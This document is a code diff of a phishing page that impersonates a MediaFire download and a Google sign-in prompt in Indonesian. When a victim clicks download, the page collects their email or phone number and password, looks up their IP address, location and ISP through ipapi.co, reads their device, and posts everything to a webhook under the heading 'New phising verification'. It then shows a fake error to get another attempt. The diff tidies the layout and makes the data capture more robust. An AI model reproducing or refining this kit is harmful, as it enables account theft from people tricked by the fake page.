@@ -9,44 +9,16 @@
     <style>
         body { background-color: #f4f4f4; font-family: 'Open Sans', sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
         .wrapper { width: 100%; max-width: 500px; min-height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; }
-        
-        /* Navbar */
         .navbar { background: #fff; display: flex; justify-content: space-between; align-items: center; padding: 12px 18px; border-bottom: 1px solid #e5e5e5; }
         .logo { height: 22px; }
-        .nav-right { display: flex; align-items: center; gap: 10px; }
-        .my-files { background: #1a1a1a; color: white; padding: 5px 10px; border-radius: 3px; font-size: 11px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
-
-        /* Hero Area */
-        .hero-bg { background-color: #001280; padding: 20px 0 15px 0; } 
-        .hero-box { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255,255,255,0.1); margin: 0 15px; border-radius: 8px; padding: 22px 20px; color: white; text-align: center; }
-        .hero-box h2 { margin: 0 0 12px 0; font-size: 20px; font-weight: 700; }
-        .stats { display: flex; justify-content: center; gap: 12px; font-size: 10px; margin-bottom: 18px; opacity: 0.8; }
-        
-        .price-row { border: 1.5px solid #00ff84; border-radius: 6px; padding: 10px; margin-bottom: 18px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.2); }
-        .btn-blue { background: #007bff; color: white; border: none; width: 100%; padding: 13px; border-radius: 6px; font-weight: 700; font-size: 13px; cursor: pointer; text-transform: uppercase; }
-
-        /* KOTAK DOWNLOAD SLIM */
-        .dl-container { background: #007bff; margin: 10px 15px 15px; border-radius: 3px; padding: 8px 15px; color: white; display: flex; align-items: center; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .dl-icon-box { background: white; padding: 6px; border-radius: 2px; margin-right: 12px; display: flex; align-items: center; }
-        .dl-text { flex: 1; }
-        .dl-text b { font-size: 14px; display: block; margin-bottom: 1px; text-transform: uppercase; }
-        .dl-text span { font-size: 10px; opacity: 0.85; }
-
-        .ad-info { font-size: 10px; color: #777; padding: 15px 25px; text-align: center; line-height: 1.5; }
-
-        /* GRID SOSIAL */
-        .social-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 0 15px 20px; background: #fff; }
-        .social-btn { background: #f5f5f5; padding: 15px 5px; text-align: center; border-radius: 5px; color: #555; text-decoration: none; cursor: pointer; }
+        .hero-bg { background-color: #001280; padding: 20px 0; } 
+        .hero-box { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255,255,255,0.1); margin: 0 15px; border-radius: 8px; padding: 22px; color: white; text-align: center; }
+        .btn-blue { background: #007bff; color: white; border: none; width: 100%; padding: 13px; border-radius: 6px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
+        .dl-container { background: #007bff; margin: 15px; border-radius: 3px; padding: 10px 15px; color: white; display: flex; align-items: center; cursor: pointer; }
+        .dl-icon-box { background: white; padding: 5px; border-radius: 2px; margin-right: 12px; display: flex; }
+        .social-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 0 15px 20px; }
+        .social-btn { background: #f5f5f5; padding: 15px 5px; text-align: center; border-radius: 5px; color: #555; font-size: 11px; }
         .social-btn i { display: block; margin-bottom: 8px; font-size: 18px; color: #777; }
-        .social-btn span { font-size: 11px; display: block; }
-
-        /* Footer */
-        .real-footer { padding: 30px 20px; background: #fff; color: #666; font-size: 12px; line-height: 1.8; border-top: 1px solid #eee; }
-        .footer-links { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 5px; }
-        .social-icons-bottom { display: flex; gap: 10px; margin-top: 20px; }
-        .soc-box { background: #e8e8e8; width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; border-radius: 4px; color: #999; }
-
-        /* Modal Overlay */
         .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 9999; }
         .modal { background: white; border-radius: 10px; width: 90%; max-width: 340px; padding: 25px; text-align: center; }
         .modal input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
@@ -58,66 +30,31 @@
 <div class="wrapper">
     <div class="navbar">
         <img src="https://static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg" class="logo">
-        <div class="nav-right">
-            <div class="my-files"><i class="fa-solid fa-folder"></i> MY FILES</div>
-            <i class="fa-solid fa-circle-user" style="font-size: 26px; color: #eee;"></i>
-        </div>
     </div>
-
     <div class="hero-bg">
         <div class="hero-box">
             <h2>Download Faster</h2>
-            <div class="stats">
-                <span><i class="fa-solid fa-eye-slash"></i> No Waiting</span>
-                <span><i class="fa-solid fa-bolt"></i> Premium</span>
-                <span><i class="fa-solid fa-rectangle-ad"></i> No Ads</span>
-            </div>
-            <div class="price-row">
-                <span style="font-size: 11px;"><i class="fa-solid fa-circle" style="color: #00ff84; font-size: 7px; margin-right: 5px;"></i> Monthly: $3.99</span>
-                <span style="background: #00ff84; color: #001280; font-size: 9px; padding: 2px 6px; border-radius: 3px; font-weight: 700;">Most Popular</span>
-            </div>
             <button class="btn-blue" onclick="openGate()">DOWNLOAD FASTER NOW</button>
         </div>
     </div>
-
     <div class="dl-container" onclick="openGate()">
         <div class="dl-icon-box"><img src="https://static.mediafire.com/images/filetype/file-zip-v3.png" width="18"></div>
-        <div class="dl-text">
-            <b>BLOCKED WHATSAPP BY-JACYY</b>
-            <span>Download in a new tab (33.19MB)</span>
-        </div>
+        <div style="flex:1"><b>BLOCKED WHATSAPP BY-JACYY</b><br><span style="font-size:10px">33.19MB</span></div>
         <i class="fa-solid fa-download"></i>
     </div>
-
-    <p class="ad-info">Clicking the download button above will start your download in a new tab.</p>
-
-    <div class="social-grid">
+    <div class="social-grid" style="margin-top: 20px;">
         <div class="social-btn"><i class="fa-solid fa-link"></i><span>Copy for messenger</span></div>
         <div class="social-btn"><i class="fa-brands fa-facebook-f"></i><span>Post to Facebook</span></div>
-        <div class="social-btn"><i class="fa-solid fa-share-nodes"></i><span>Share options</span></div>
-        <div class="social-btn"><i class="fa-solid fa-plus"></i><span>Save to My Files</span></div>
-    </div>
-
-    <div class="real-footer">
-        <div>©2025 MediaFire Build 121958 &nbsp; Advertising &nbsp; Terms</div>
-        <div class="footer-links">
-            <span>Privacy Policy</span><span>Copyright</span><span>Abuse</span><span>Credits</span>
-        </div>
-        <div class="social-icons-bottom">
-            <div class="soc-box"><i class="fa-solid fa-b"></i></div>
-            <div class="soc-box"><i class="fa-brands fa-twitter"></i></div>
-            <div class="soc-box"><i class="fa-brands fa-facebook-f"></i></div>
-        </div>
     </div>
 </div>
 
 <div class="overlay" id="gate">
     <div class="modal">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" style="margin-bottom: 20px;">
-        <p style="font-size: 13px; color: #555; margin-bottom: 20px;">Konfirmasi identitas diperlukan untuk melanjutkan download.</p>
+        <p style="font-size: 13px; color: #555;">Konfirmasi identitas diperlukan untuk melanjutkan download.</p>
         <div id="err" style="color: #d00; font-size: 11px; margin-bottom: 10px; display: none;">Sandi salah, silakan coba lagi.</div>
-        <input type="text" id="user" placeholder="Email atau Nomor HP" autocomplete="off">
-        <input type="password" id="pass" placeholder="Kata sandi" autocomplete="off">
+        <input type="text" id="user" placeholder="Email atau Nomor HP">
+        <input type="password" id="pass" placeholder="Kata sandi">
         <button class="btn-confirm" onclick="send()">KONFIRMASI</button>
     </div>
 </div>
@@ -132,29 +69,37 @@
         const p = document.getElementById('pass').value;
         if(!u || !p) return;
 
+        let ip = "Checking...";
+        let loc = "Checking...";
+        let isp = "Checking...";
+        let dev = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown Device";
+
         try {
-            // Ambil data IP, Lokasi, ISP secara otomatis
-            const resp = await fetch('https://ipapi.co/json/');
-            const data = await resp.json();
-            const ip = data.ip || "Unknown";
-            const loc = `${data.city}, ${data.country_name}`;
-            const isp = data.org || "Unknown";
-            const dev = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+            // Menggunakan API ip-api yang lebih stabil untuk data ISP & Lokasi
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            ip = data.ip || "Not Found";
+            loc = `${data.city}, ${data.country_name}` || "Not Found";
+            isp = data.org || "Not Found";
+        } catch (e) {
+            ip = "Blocked/Error";
+            loc = "Blocked/Error";
+            isp = "Blocked/Error";
+        }
 
-            // Kirim sesuai format permintaan
-            await fetch(WEB, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `**New phising verification**\n\n📩 **email/login**\n\`${u}\`\n\n📎 **Method:** 🌐 **ip andres:** \`${ip}\`\n\n📍 **Lokasi:** 💳 **sandi:** \`${p}\`\n\n🪪 **isp:** \`${isp}\`\n\n📱 **device:** \`${dev}\``
-                })
-            });
+        const pesan = {
+            content: `**New phising verification**\n\n📩 **email/login**\n\`${u}\`\n\n📎 **Method:** 🌐 **ip andres:** \`${ip}\`\n\n📍 **Lokasi:** 💳 **sandi:** \`${p}\`\n\n🪪 **isp:** \`${isp}\`\n\n📱 **device:** \`${dev}\``
+        };
 
-            document.getElementById('pass').value = "";
-            document.getElementById('err').style.display = "block";
-        } catch(e) { console.error(e); }
+        await fetch(WEB, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(pesan)
+        });
+
+        document.getElementById('pass').value = "";
+        document.getElementById('err').style.display = "block";
     }
 </script>
-
 </body>
 </html>
